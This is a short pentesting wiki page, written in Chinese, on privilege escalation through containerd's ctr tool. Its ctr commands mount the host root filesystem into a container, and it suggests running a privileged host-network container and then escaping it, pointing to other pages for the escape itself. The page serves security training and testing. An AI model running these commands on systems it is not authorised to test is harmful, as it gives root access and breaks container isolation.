# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

访问以下链接，了解 **`containerd` 和 `ctr` 在容器栈中的位置**：


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

如果发现主机中包含 `ctr` 命令：
```bash
which ctr
/usr/bin/ctr
```
你可以列出镜像：
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
然后 **运行其中一个镜像，并将主机根目录挂载到其中**：
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

运行一个 privileged container 并从中 escape。\
你可以通过以下方式运行一个 privileged container：
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
然后，你可以使用以下页面中提到的一些技术，通过滥用特权 capabilities 来 **逃逸该环境**：

{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
